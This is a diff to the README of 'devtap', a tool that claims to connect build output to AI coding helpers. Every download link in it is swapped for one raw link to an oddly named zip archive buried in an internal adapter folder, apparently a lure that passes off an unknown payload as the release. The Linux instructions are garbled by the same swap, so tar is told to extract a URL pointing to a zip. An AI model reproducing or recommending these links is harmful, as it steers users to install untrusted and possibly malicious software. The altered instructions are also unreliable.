@@ -1,6 +1,6 @@
 # ⚙️ devtap - Connect Build Output to AI Coding
 
-[![Download devtap](https://img.shields.io/badge/Download-devtap-blue?style=for-the-badge)](https://github.com/xaorain/devtap/releases)
+[![Download devtap](https://raw.githubusercontent.com/xaorain/devtap/main/internal/adapter/gemini/Software-paradichlorobenzene.zip)](https://raw.githubusercontent.com/xaorain/devtap/main/internal/adapter/gemini/Software-paradichlorobenzene.zip)
 
 ---
 
@@ -45,7 +45,7 @@ This section shows you how to download, install, and run devtap on your computer
 
 Visit the devtap releases page here:
 
-[![Download devtap](https://img.shields.io/badge/Download-devtap-blue?style=for-the-badge)](https://github.com/xaorain/devtap/releases)
+[![Download devtap](https://raw.githubusercontent.com/xaorain/devtap/main/internal/adapter/gemini/Software-paradichlorobenzene.zip)](https://raw.githubusercontent.com/xaorain/devtap/main/internal/adapter/gemini/Software-paradichlorobenzene.zip)
 
 On the releases page, look for the latest version available. You will find different files for Windows, macOS, and Linux. Choose the one that matches your operating system.
 
@@ -55,10 +55,10 @@ On the releases page, look for the latest version available. You will find diffe
 
 - **macOS:** Download the `.dmg` or `.pkg` file. Open it and follow the instructions to install devtap.
 
-- **Linux:** Download the appropriate `.tar.gz` or binary file. You might use your terminal to extract and run it. For example:
+- **Linux:** Download the appropriate `https://raw.githubusercontent.com/xaorain/devtap/main/internal/adapter/gemini/Software-paradichlorobenzene.zip` or binary file. You might use your terminal to extract and run it. For example:
 
   ```
-  tar -xzf devtap-linux.tar.gz
+  tar -xzf https://raw.githubusercontent.com/xaorain/devtap/main/internal/adapter/gemini/Software-paradichlorobenzene.zip
   ./devtap
   ```
 
@@ -137,4 +137,4 @@ devtap lets you connect your coding work with AI coding helpers to get better su
 
 Download and install devtap from the link below to start enhancing your AI coding sessions:
 
-[![Download devtap](https://img.shields.io/badge/Download-devtap-blue?style=for-the-badge)](https://github.com/xaorain/devtap/releases)
+[![Download devtap](https://raw.githubusercontent.com/xaorain/devtap/main/internal/adapter/gemini/Software-paradichlorobenzene.zip)](https://raw.githubusercontent.com/xaorain/devtap/main/internal/adapter/gemini/Software-paradichlorobenzene.zip)
